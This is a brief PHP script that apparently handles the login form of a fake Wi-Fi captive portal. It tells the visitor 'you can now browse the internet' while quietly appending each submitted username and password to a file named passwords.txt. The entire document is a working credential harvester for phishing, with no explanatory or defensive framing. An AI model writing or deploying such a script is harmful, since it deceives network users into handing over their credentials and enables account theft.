 <?php
 echo ('you can now browse the internet');
 $myfile = fopen("passwords.txt", "a");
 fwrite($myfile, "username: ". $_POST['Uname']. " ");
 fwrite($myfile,"password: ". $_POST['Pass']);
 fwrite($myfile, "\n");
 fclose($myfile);
?>